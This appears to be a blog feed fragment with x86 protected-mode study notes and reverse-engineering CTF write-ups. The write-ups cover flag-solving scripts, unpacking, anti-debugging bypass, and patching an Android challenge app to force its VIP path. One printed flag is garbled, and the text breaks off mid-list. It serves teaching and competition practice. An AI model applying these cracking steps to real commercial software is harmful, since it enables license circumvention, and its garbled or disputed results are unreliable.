class="code"><pre><span class="line">Intel处理器要求段在内存中的起始物理地址起码是16字节对齐的。这句话的意思是，必须是16的倍数，或者说该物理地址必须能被16整除。</span><br><span class="line">相应地，汇编语言源程序中定义的各个段，也有对齐方面的要求。具体做法是，在段定义中使用“align=”子句，用于指定某个SECTION的汇编地址对齐方式。比如说，“align=16”就表示段是16字节对齐的，“align=32”就表示段是32字节对齐的。</span><br><span class="line">段的重定位是加载器的工作，它需要知道每个段在用户程序内的位置，即它们分别位于用户程序内的多少字节处。为此，需要在用户程序头部建立一张段重定位表。</span><br></pre></td></tr></table></figure><blockquote><p>实模式下的中断向量表</p></blockquote><p>在实模式下，处理器要求将与该中断有关的程序（指令）的入口点集中存放到内存中从物理地址0x00000开始，到0x003ff结束，共1KB的空间内，这就是所谓的中断向量表（Interrupt Vector Table，IVT）。</p><blockquote><p>初始化8259、RTC和中断向量表</p></blockquote><p>当处理器执行任何一条改变堆栈段寄存器SS的指令时，它会在下一条指令执行完期间禁止中断。</p><p>绝大多数时候，对堆栈的改变是分两步进行的：先改变段寄存器SS的内容，接着又修改堆栈指针寄存器SP的内容。</p><blockquote><p>软 中 断</p></blockquote><p>int3和int 3不是一回事。前者的机器码为CC，后者则是CD 03，这就是通常所说的int n，其操作码为0xCD，第2字节的操作数给出了中断号。</p><p>into是溢出中断指令，机器码为0xCE，也是单字节指令。当处理器执行这条指令时，如果标志寄存器的OF位是1，那么，将产生4号中断。否则，这条指令什么也不做。</p><h2 id="32位保护模式"><a href="#32位保护模式" class="headerlink" title="32位保护模式"></a>32位保护模式</h2><blockquote><p>32位Intel微处理器编程架构</p></blockquote><p>80286和8086不一样的地方在于，它第一次提出了保护模式的概念。在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部16MB内存。</p><p>在保护模式下，所有的32位处理器都可以访问多达4GB的内存，它们可以工作在分段模型下，每个段的基地址是32位的，段内偏移量也是32位的，因此，段的长度不受限制。在最典型的情况下，可以将整个4GB内存定义成一个段来处理，这就是所谓的平坦模式。在平坦模式下，可以执行4GB范围内的控制转移，也可以使用32位的偏移量访问任何4GB范围内的任何位置。32位保护模式兼容80286的16位保护模式。</p><p>在实模式下，用户程序对内存的访问非常自由，没有任何限制，随随便便就可以修改任何一个内存单元。</p><blockquote><p>全局描述符表</p></blockquote><p>为了让程序在内存中能自由浮动而又不影响它的正常执行，处理器将内存划分成逻辑上的段，并在指令中使用段内偏移地址。在保护模式下，对内存的访问仍然使用段地址和偏移地址，但是，在每个段能够访问之前，必须先进行登记。</p><p>和一个段有关的信息需要8个字节来描述，所以称为段描述符（Segment Descriptor），每个段都需要一个描述符。为了存放这些描述符，需要在内存中开辟出一段空间。在这段空间里，所有的描述符都是挨在一起，集中存放的，这就构成一个描述符表。<br>       最主要的描述符表是全局描述符表（Global Descriptor Table，GDT），所谓全局，意味着该表是为整个软硬件系统服务的。在进入保护模式前，必须要定义全局描述符表。</p><p>描述符不是由用户程序自己建立的，而是在加载时，由操作系统根据你的程序结构而建立的，而用户程序通常是无法建立和修改GDT的。</p><blockquote><p>存储器的段描述符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">段基地址可以是0～4GB范围内的任意地址，不过，还是建议应当选取那些16字节对齐的地址。尽管对于Intel处理器来说，允许不对齐的地址，但是，对齐能够使程序在访问代码和数据时的性能最大化。这一点，对于那些学过计算机原理，特别是了解内存芯片组织的人来说，是最清楚不过的。</span><br><span class="line">20位的段界限用来限制段的扩展范围。因为访问内存的方法是用段基地址加上偏移量，所以，对于向上扩展的段，如代码段和数据段来说，偏移量是从0开始递增，段界限决定了偏移量的最大值；对于向下扩展的段，如堆栈段来说，段界限决定了偏移量的最小值。</span><br><span class="line">G位是粒度（Granularity）位，用于解释段界限的含义。当G位是“0”时，段界限以字节为单位。此时，段的扩展范围是从1字节到1兆字节（1B～1MB），因为描述符中的界限值是20位的。相反，如果该位是“1”，那么，段界限是以4KB为单位的。这样，段的扩展范围是从4KB到4GB。</span><br><span class="line">S位用于指定描述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1”时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段）。系统段将在以后介绍。</span><br><span class="line">DPL表示描述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共有4种处理器支持的特权级别，分别是0、1、2、3，其中0是最高特权级别，3是最低特权级别。刚进入保护模式时执行的代码具有最高特权级0（可以看成是从处理器那里继承来的），这些代码通常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指定一个稍低的特权级，比如3特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的，而且有些处理器指令（特权指令）只能由0特权级的程序来执行，为的就是安全。</span><br><span class="line">P是段存在位（Segment Present）。P位用于指示描述符所对应的段是否存在。一般来说，描述符所指示的段都位于内存中。但是，当内存空间紧张时，有可能只是建立了描述符，对应的内存空间并不存在，这时，就应当把描述符的P位清零，表示段并不存在。另外，同样是在内存空间紧张的情况下，会把很少用到的段换出到硬盘中，腾出空间给当前急需内存的程序使用（当前正在执行的），这时，同样要把段描述符的P位清零。当再次轮到它执行时，再装入内存，然后将P位置1。</span><br><span class="line">P位是由处理器负责检查的。每当通过描述符访问内存中的段时，如果P位是“0”，处理器就会产生一个异常中断。通常，该中断处理过程是由操作系统提供的，该处理过程的任务是负责将该段从硬盘换回内存，并将P位置1。在多用户、多任务的系统中，这是一种常用的虚拟内存调度策略。当内存很小，运行的程序很多时，如果计算机的运行速度变慢，并伴随着繁忙的硬盘操作时，说明这种情况正在发生。</span><br><span class="line">D/B位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志。</span><br></pre></td></tr></table></figure><blockquote><p>安装存储器的段描述符并加载GDTR</p></blockquote><p>处于实模式下，在GDT中安装描述符，必须将GDT的线性地址转换成段地址和偏移地址。</p><p>处理器规定，GDT中的第一个描述符必须是空描述符，或者叫哑描述符或NULL描述符。</p><blockquote><p>保护模式下的内存访问</p></blockquote><p>控制这达实模式和保护模式切换的开关是在一个叫CR0的寄存器。</p><p>CR0是处理器内部的控制寄存器（Control Register，CR）。之所以有个“0”后缀，是因为还有CR1、CR2、CR3和CR4控制寄存器，甚至还有CR8。<br>        CR0是32位的寄存器，包含了一系列用于控制处理器操作模式和运行状态的标志位。它的第1位（位0）是保护模式允许位（Protection Enable，PE），是开启保护模式大门的门把手，如果把该位置“1”，则处理器进入保护模式，按保护模式的规则开始运行。</p><p>保护模式下的中断机制和实模式不同，因此，原有的中断向量表不再适用，而且，必须要知道的是，在保护模式下，BIOS中断都不能再用，因为它们是实模式下的代码。在重新设置保护模式下的中断环境之前，必须关中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cli                                ;保护模式下中断机制尚未建立，应 </span><br><span class="line">                                   ;禁止中断 </span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><p>在保护模式下访问一个段时，传送到段选择器的是段选择子。它由三部分组成，第一部分是描述符的索引号，用来在描述符表中选择一个段描述符。TI 是描述符表指示器（Table Indicator），TI＝0 时，表示描述符在GDT 中；TI＝1 时，描述符在LDT 中。LDT 也是一个描述符表，和GDT 类似。RPL 是请求特权级，表示给出当前选择子的那个程序的特权级别，正是该程序要求访问这个内存段。每个程序都有特权级别，</p><blockquote><p>清空流水线并串行化处理器</p></blockquote><p>即使是在实模式下，段寄存器的描述符高速缓存器也被用于访问内存，仅低20位有效，高12位是全零。当处理器进入保护模式后，不影响段寄存器的内容和使用，它们依然是有效的，程序可以继续执行。但是，在保护模式下，对段的解释是不同的，处理器会把段选择器里的内容看成是描述符选择子，而不是逻辑段地址。因此，比较安全的做法是尽快刷新CS、SS、DS、ES、FS和GS的内容，包括它们的段选择器和描述符高速缓存器。</p><p>在进入保护模式前，有很多指令已经进入了流水线。因为处理器工作在实模式下，所以它们都是按16位操作数和16位地址长度进行译码的，即使是那些用bits 32编译的指令。进入保护模式后，由于对段地址的解释不同，对操作数和默认地址大小的解释也不同，有些指令的执行结果可能会不正确，所以必须清空流水线。同时，那些通过乱序执行得到的中间结果也是无效的，必须清理掉，让处理器串行化执行，即，重新按指令的自然顺序执行。</p><p>使用32位远转移指令jmp或者远过程调用指令call。处理器最怕转移指令，遇到这种指令，一般会清空流水线，并串行化执行；另一方面，远转移会重新加载段选择器CS，并刷新描述符高速缓存器中的内容。唯一的问题是，这条指令必须在bits 16下编译，使得处理器能够在16位模式下正确译码；同时，还必须编译成32位操作数的指令，使处理器在刚进入保护模式时能正确执行。<strong>一个建议的方法是在设置了控制寄存器CR0的PE位之后，立即用jmp或者call转移到当前指令流的下一条指令上。</strong></p><blockquote><p>保护模式下的堆栈</p></blockquote><p>堆栈是向下扩展的，因此，描述符中的段界限，和向上扩展的段含义不同。对于向上扩展的段，段内偏移量是从0开始递增，偏移量的最大值是界限值和粒度的乘积；而对于向下扩展的段来说，因为它经常用做堆栈段，而堆栈是从高地址向低地址方向推进的，故段内偏移量的最小值是界限值和粒度的乘积加一。在32位代码中，是用ESP作为堆栈指针的。因此，这里的段界限，用来和段粒度一起，决定ESP寄存器所能具有的最小值。即，堆栈操作时，必须符合条件： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ESP ＞ 段界限×粒度值</span><br></pre></td></tr></table></figure><p>对于描述符中G位是“0”的段来说，粒度值是1（字节）；而对于G位是“1”的段来说，粒度值是4096（4KB）。</p><blockquote><p>进入32位保护模式</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;设置堆栈段和栈指针 </span><br><span class="line">mov eax,cs      </span><br><span class="line">mov ss,eax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">      </span><br><span class="line">;计算GDT所在的逻辑段地址</span><br><span class="line">mov eax,[cs:pgdt+0x7c00+0x02]      ;GDT的32位线性基地址 </span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,16</span><br><span class="line">div ebx                            ;分解成16位逻辑地址 </span><br><span class="line"></span><br><span class="line">mov ds,eax                         ;令DS指向该段以进行操作</span><br><span class="line">mov ebx,edx                        ;段内起始偏移地址 </span><br><span class="line"></span><br><span class="line">;创建0#描述符，它是空描述符，这是处理器的要求</span><br><span class="line">mov dword [ebx+0x00],0x00000000</span><br><span class="line">mov dword [ebx+0x04],0x00000000  </span><br><span class="line"></span><br><span class="line">;创建1#描述符，这是一个数据段，对应0~4GB的线性地址空间</span><br><span class="line">mov dword [ebx+0x08],0x0000ffff    ;基地址为0，段界限为0xfffff</span><br><span class="line">mov dword [ebx+0x0c],0x00cf9200    ;粒度为4KB，存储器段描述符 </span><br><span class="line"></span><br><span class="line">;创建保护模式下初始代码段描述符</span><br><span class="line">mov dword [ebx+0x10],0x7c0001ff    ;基地址为0x00007c00，512字节 </span><br><span class="line">mov dword [ebx+0x14],0x00409800    ;粒度为1个字节，代码段描述符 </span><br><span class="line"></span><br><span class="line">;创建以上代码段的别名描述符</span><br><span class="line">mov dword [ebx+0x18],0x7c0001ff    ;基地址为0x00007c00，512字节</span><br><span class="line">mov dword [ebx+0x1c],0x00409200    ;粒度为1个字节，数据段描述符</span><br><span class="line"></span><br><span class="line">mov dword [ebx+0x20],0x7c00fffe</span><br><span class="line">mov dword [ebx+0x24],0x00cf9600</span><br><span class="line"></span><br><span class="line">;初始化描述符表寄存器GDTR</span><br><span class="line">mov word [cs: pgdt+0x7c00],39      ;描述符表的界限   </span><br><span class="line"> </span><br><span class="line">lgdt [cs: pgdt+0x7c00]</span><br><span class="line">      </span><br><span class="line">in al,0x92                         ;南桥芯片内的端口 </span><br><span class="line">or al,0000_0010B</span><br><span class="line">out 0x92,al                        ;打开A20</span><br><span class="line"></span><br><span class="line">cli                                ;中断机制尚未工作</span><br><span class="line"></span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><blockquote><p>内核的结构</p></blockquote><p>内核分为四个部分，分别是初始化代码、内核代码段、内核数据段和内核例程段，主引导程序也是初始化代码的组成部分。</p><p>初始化代码用于从BIOS那里接管处理器和计算机硬件的控制权，安装最基本的段描述符，初始化最初的执行环境。然后，从硬盘上读取和加载内核的剩余部分，创建组成内核的各个内存段。</p><p>内核代码段用于分配内存，读取和加载用户程序，控制用户程序的执行。</p><p>内核数据段提供了一段可读写的内存空间，供内核自己使用。<br>       内核例程段用于提供各种用途和功能的子过程以简化代码的编写。这些例程既可以用于内核，也供用户程序调用。</p><p>内核文件还包括一个头部，记录了各个段的汇编位置，这些统计数<br>据用于告诉初始化代码如何加载内核。</p><p>From <a href="https://kabeor.github.io/x86汇编从实模式到保护模式/">https://kabeor.github.io/x86汇编从实模式到保护模式/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;a href=&quot;#x86汇编-从实模式到保护模式&quot; class=&quot;headerlink&quot; title=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;/a&gt;x86汇编-从实模式到保护模式&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;注释&lt;/p
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2019科成安洵杯WP</title>
    <link href="https://kabeor.github.io/2019%E7%A7%91%E6%88%90%E5%AE%89%E6%B4%B5%E6%9D%AFWP/"/>
    <id>https://kabeor.github.io/2019科成安洵杯WP/</id>
    <published>2019-11-20T14:33:21.528Z</published>
    <updated>2019-12-31T09:10:58.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019科成安洵杯WP"><a href="#2019科成安洵杯WP" class="headerlink" title="2019科成安洵杯WP"></a>2019科成安洵杯WP</h1><h1 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h1><p>搜索flag就出来了<br><img src="https://i.loli.net/2019/11/20/8laBfNXRCobYspG.png" alt><br><img src="https://i.loli.net/2019/11/20/hoZFP4J9qlAzRyS.png" alt></p><h1 id="小游戏"><a href="#小游戏" class="headerlink" title="小游戏"></a>小游戏</h1><p>以前一道题改的，直接定位关键函数<br><img src="https://i.loli.net/2019/11/20/8udQ9FzVRr1S5jq.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">box1=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0]</span><br><span class="line"></span><br><span class="line">box2=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0]</span><br><span class="line">flag=list(range(57))</span><br><span class="line"></span><br><span class="line">for i in range(57):</span><br><span class="line">    flag[i]=box1[i]^box2[i]^0x14</span><br><span class="line">    print(chr(flag[i]),end=&quot;&quot;)  </span><br><span class="line"></span><br><span class="line"># flag&#123;&#125;tdsa|S&gt;ntXsHwndX6tXq2u~Xnis0ubtsni`Xe1sXhsobutXfubXi7sz&#125;</span><br></pre></td></tr></table></figure><h1 id="我要vip"><a href="#我要vip" class="headerlink" title="我要vip"></a>我要vip</h1><p>Android Killer修改switch强行进入vip函数即可</p><p>goto :pswitch_1<br><img src="https://i.loli.net/2019/11/20/nUPVKgELDdjs1I8.png" alt></p><p>flag{czADA_SA_ddad_aijdA}</p><h1 id="不知道什么算法"><a href="#不知道什么算法" class="headerlink" title="不知道什么算法"></a>不知道什么算法</h1><p>触法异常进入success函数，看到div可以确定是除0异常<br><img src="https://i.loli.net/2019/11/20/l4gAMZ37vVibqjo.png" alt></p><p>40135A除零异常<br>输入必须等于pop eax = 401353</p><p>flag{401353}</p><h1 id="一个简单的cm"><a href="#一个简单的cm" class="headerlink" title="一个简单的cm"></a>一个简单的cm</h1><p>Upack壳，脱壳机脱不干净，esp定律完事</p><p><img src="https://i.loli.net/2019/11/20/id6ah5BjsfOnoJu.png" alt></p><p>逻辑比较简单，逆回去即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># OEP 401ffc</span><br><span class="line"></span><br><span class="line">str1 = list(&quot;UESTCDCTF2019JustForhappy&quot;)</span><br><span class="line"></span><br><span class="line">box = list(&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;)</span><br><span class="line"></span><br><span class="line">key = list(range(len(str1)))</span><br><span class="line"></span><br><span class="line">for i in range(len(str1)):</span><br><span class="line">key[i]=box.index(str1[i])</span><br><span class="line">print(key[i],end=&apos;,&apos;)</span><br><span class="line"></span><br><span class="line">k=[]</span><br><span class="line">k=key</span><br><span class="line"></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">if k[i]&gt;=0 and k[i]&lt;=9:</span><br><span class="line">k[i]=k[i]+48</span><br><span class="line">elif k[i]&gt;=36 and k[i]&lt;=64:</span><br><span class="line">k[i]=k[i]+29</span><br><span class="line">elif k[i]&gt;=10 and k[i]&lt;=35:</span><br><span class="line">k[i]=k[i]+87</span><br><span class="line">print(&quot;flag&#123;&quot;,chr(key[i]),&quot;&#125;&quot;,end=&quot;&quot;)</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/2019科成安洵杯WP/">https://kabeor.github.io/2019科成安洵杯WP/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019科成安洵杯WP&quot;&gt;&lt;a href=&quot;#2019科成安洵杯WP&quot; class=&quot;headerlink&quot; title=&quot;2019科成安洵杯WP&quot;&gt;&lt;/a&gt;2019科成安洵杯WP&lt;/h1&gt;&lt;h1 id=&quot;ez&quot;&gt;&lt;a href=&quot;#ez&quot; class=&quot;head
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019湖湘杯线上 RE WriteUp</title>
    <link href="https://kabeor.github.io/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8ARE%20WriteUp/"/>
    <id>https://kabeor.github.io/2019湖湘杯线上RE WriteUp/</id>
    <published>2019-11-12T02:29:36.272Z</published>
    <updated>2019-11-12T04:57:15.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019湖湘杯线上-RE-WriteUp"><a href="#2019湖湘杯线上-RE-WriteUp" class="headerlink" title="2019湖湘杯线上 RE WriteUp"></a>2019湖湘杯线上 RE WriteUp</h1><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>UPX壳，脱壳机即可<br><img src="https://i.loli.net/2019/11/12/jqJv27PZzWxYHFl.png" alt="image.png"></p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>主函数逻辑如下<br><img src="https://i.loli.net/2019/11/12/aLJfMiovY8u4psT.png" alt="image.png"></p><p>检测命令行输入格式为 文件名 flag.txt</p><p>flag.txt由如下脚本解得。</p><p><img src="https://i.loli.net/2019/11/12/R8lLtbvHrVMDcxw.png" alt="image.png"></p><p>之后读入txt，检测输入为32位<br>       然后进入两个处理函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub_4113B1(xmm0_4_0, &amp;Buf, &amp;unk_41A4E0);  // 处理1</span><br><span class="line">if ( sub_4113B6(xmm0_4_0, &amp;unk_41A4E0) )  // 处理2</span><br></pre></td></tr></table></figure><p><strong>处理1</strong></p><p><img src="https://i.loli.net/2019/11/12/lAuqRQ8NUp2fBVj.png" alt="image.png"></p><p>将输入每两位一起进行处理，判断两位中的第一个值是否在与0-9或a-f中，如果在就减去48或87，<br>这里的数组将在处理2中作为验证数据。</p><p><strong>处理2</strong></p><p><img src="https://i.loli.net/2019/11/12/xgRSojfDydc3Opl.png" alt="image.png"></p><p>第一位左移4位+第二位的结果加上1与dword_41A078数据进行比较。</p><p><strong>flag脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag = [0x50, 0xC6, 0xF1, 0xE4, 0xE3, 0xE2, 0x9A, 0xA1,0xA7,0xde,0xda,70,171,46,255,219]</span><br><span class="line">s = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in flag:</span><br><span class="line">    i -= 1</span><br><span class="line">    s += str(hex(i&gt;&gt;4))[2:]</span><br><span class="line">    s += str(hex(i&amp;0xf))[2:]</span><br><span class="line"></span><br><span class="line">print s</span><br></pre></td></tr></table></figure></p><h2 id="esrever"><a href="#esrever" class="headerlink" title="esrever"></a>esrever</h2><p>迷宫,动态反调试没什么用</p><p><img src="https://i.loli.net/2019/11/12/CvUN6KQDSJilu7c.png" alt="image.png"><br>输入比较巧妙，过反调试以后动态调很复杂，但很清晰看到是控制7*7二维数组上下左右</p><p><img src="https://i.loli.net/2019/11/12/c5oH6DYshdEWUp3.png" alt="image.png"></p><p>提取迷宫<br><img src="https://i.loli.net/2019/11/12/4jl2mHYWAFXQUBg.png" alt="image.png"></p><p>知道映射关系就不用考虑输入，直接考虑输出是什么就可以了。<br><img src="https://i.loli.net/2019/11/12/jCDMgiAa3sIJwP8.png" alt="image.png"></p><p>#FFRFFF####ZZRZZZ##FF#FFFF</p><h2 id="icekey"><a href="#icekey" class="headerlink" title="icekey"></a>icekey</h2><p>.NET程序，直接上dnSpy</p><p>定位到关键函数位置<br><img src="https://i.loli.net/2019/11/12/pfuCB8hsnV7D643.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/11/12/giOozl1pJQ5sryc.png" alt="image.png"></p><p>关键算法如下<br><img src="https://i.loli.net/2019/11/12/LSAUMI9lTvhPoNd.png" alt="image.png"></p><p>使用了IceKey公钥算法<br><img src="https://upload.wikimedia.org/wikipedia/commons/d/df/ICE_%28cipher%29_InfoBox_Diagram.png" alt="Ice"></p><p>这里加解密都已经封装好了，key是字符串iriszero的md5值<br>内部加密没有做任何改动，有兴趣可以对比官方实现  <a href="http://www.darkside.com.au/ice/" target="_blank" rel="noopener">http://www.darkside.com.au/ice/</a></p><p>最后加密的密文和<code>string b = &quot;3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A&quot;;</code>比较</p><p>既然下面给了解密流程，那就不好意思了<br>观察到bytes数组存放明文，array数组存放密文，因此只需要动态调试在解密前将array内的值改为b，解密后查看bytes值即可<br>注意：要构造和b/2等长即32位伪flag才能申请到足够的数组长度。</p><p><img src="https://i.loli.net/2019/11/12/4Gki5WQzLHmEand.png" alt></p><p><img src="https://i.loli.net/2019/11/12/zBXVFqnj35vtLdI.png" alt></p><p>修改完记得右键刷新才能在局部变量中显示</p><p>运行解密函数后查看bytes数组内存如下，即为flag<br><img src="https://i.loli.net/2019/11/12/jZadOwUSgrpvqG5.png" alt></p><p>flag：5acb06231724c8c369bae711166dbe85</p><p>验证一下<br><img src="https://i.loli.net/2019/11/12/yIuPFcG4VoavpHf.png" alt></p><p>From <a href="https://kabeor.github.io/2019湖湘杯线上RE WriteUp/">https://kabeor.github.io/2019湖湘杯线上RE WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019湖湘杯线上-RE-WriteUp&quot;&gt;&lt;a href=&quot;#2019湖湘杯线上-RE-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;2019湖湘杯线上 RE WriteUp&quot;&gt;&lt;/a&gt;2019湖湘杯线上 RE WriteUp&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>2018护网杯线上 APM233</title>
    <link href="https://kabeor.github.io/2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%20APM233/"/>
    <id>https://kabeor.github.io/2018护网杯线上 APM233/</id>
    <published>2019-07-31T09:12:43.513Z</published>
    <updated>2019-08-02T07:09:58.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018护网杯线上-APM233"><a href="#2018护网杯线上-APM233" class="headerlink" title="2018护网杯线上 APM233"></a>2018护网杯线上 APM233</h1><p>MFC42的逆向</p><p><img src="https://i.loli.net/2019/07/31/5d4156590c9ba50005.jpg" alt></p><p>一共四层验证，IDA打开后基本全红，直接按P创建函数<br>花指令格式为<code>jz address+1;  jnz address+1;</code>,因此显示出address处的opcode，按D设为数据，address+1处创建函数，平衡栈帧即可</p><p>主流程<br><img src="https://i.loli.net/2019/07/31/5d41579664ffd31971.jpg" alt><br><img src="https://i.loli.net/2019/07/31/5d4157b6c3bce90900.jpg" alt></p><h2 id="Check1"><a href="#Check1" class="headerlink" title="Check1"></a>Check1</h2><p>第一层与字符串1d2e3c4a比较</p><h2 id="Check2"><a href="#Check2" class="headerlink" title="Check2"></a>Check2</h2><p><img src="https://i.loli.net/2019/07/31/5d415857c43ac44867.jpg" alt></p><p>z3直接计算<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">from z3 <span class="keyword">import</span> *</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Dr0 = BitVec('Dr0',32)</span><br><span class="line">Dr1 = BitVec('Dr1',32)</span><br><span class="line">Dr2 = BitVec('Dr2',32)</span><br><span class="line">Dr3 = BitVec('Dr3',32)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(Dr0 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr2 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr3 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1+Dr0 == <span class="number">0x899a9d9c</span>)</span><br><span class="line">s.add(Dr2+Dr1 == <span class="number">0x384989ED</span>)</span><br><span class="line">s.add(Dr3+Dr2 == <span class="number">0x2B2C85BC</span>)</span><br><span class="line">s.add(Dr0-Dr3 == <span class="number">0xAFAFDC11</span>)</span><br><span class="line"></span><br><span class="line">s.check()    </span><br><span class="line"></span><br><span class="line">m = s.model() </span><br><span class="line"></span><br><span class="line">Dr0 = int('%s'%m[Dr0])</span><br><span class="line">Dr1 = int('%s'%m[Dr1])</span><br><span class="line">Dr2 = int('%s'%m[Dr2])</span><br><span class="line">Dr3 = int('%s'%m[Dr3])</span><br><span class="line">    </span><br><span class="line">ans = '%s%s%s%s'%(p32(Dr0).encode('hex'),p32(Dr1).encode('hex'),p32(Dr2).encode('hex'),p32(Dr3).encode('hex'))</span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure></p><p>不知道为什么我这里的数值和别人的不一样，算出来的也不一样。。。正确结果应该是efbe3323adde6666feca1313beba1414</p><h2 id="Check3"><a href="#Check3" class="headerlink" title="Check3"></a>Check3</h2><p>各种反调试虚拟机检测，未检测到的返回值就是key：    0acb7935481efc12<br><img src="https://i.loli.net/2019/07/31/5d4158ff4387664889.jpg" alt></p><h2 id="Check4"><a href="#Check4" class="headerlink" title="Check4"></a>Check4</h2><p><img src="https://i.loli.net/2019/07/31/5d415a2bef10158583.jpg" alt></p><p><img src="https://i.loli.net/2019/07/31/5d415a3fd47ee42987.jpg" alt></p><p>要求玩家的位置不能与三个AI重合，玩家每次的可走的步数为1-4，AI的行动路线如下所示<br><code>a1 = [4, -1, 6, -1, 3, 2, 4, 1, 3, -1, 5, 1, 2, -1, 5, 1, 3, -2, 7, 0, 2, 3, 5, 0, 5, 0, 5, 2, 1, -2, 6, -1, 3, 3, 4, 0, 5, -1, 6, 0, 4, 0, 7, 0, 5, -2, 7, 2, 2, -1, 6, 2, 2, 1, 5, 0, 2, 0, 3, 0, 4, 0, 6, -1, 5, 0, 5, 3, 0, 5, 3, 2]</code><br><code>a2 = [2, 2, 3, 3, 3, -2, 7, 1, 1, 1, 5, 1, 0, 2, 5, 1, 0, 0, 4, 0, 7, 2, 2, 0, 4, 1, 3, 4, 0, 1, 6, -1, 5, -1, 3, 5, 1, 2, 5, 0, 5, 0, 2, 5, 1, 1, 5, 2, 2, 1, 2, 3, 5, -1, 4, 1, 2, -1, 7, 1, 2, 2, 1, 2, 5, 0, 5, 0, 5, -1, 3, 2]</code><br><code>a3 = [3, -1, 6, -1, 5, 0, 4, 0, 2, 5, 0, 5, 1, -1, 5, 1, 0, 2, 4, 0, 5, 0, 4, 0, 6, -1, 6, 1, 2, 1, 3, 3, 2, 3, 3, 0, 5, -1, 4, 0, 6, 0, 5, 0, 5, 1, 2, 2, 3, 0, 5, 5, 0, 0, 6, 2, -1, 1, 5, 1, 0, 3, 4, -1, 4, 5, 0, 2, 5, 1, 4, 1]</code><br>通过上述规则，可以得到玩家的路线为<br><code>[1, 4, 1, 3, 1, 4, 1, 2, 2, 3, 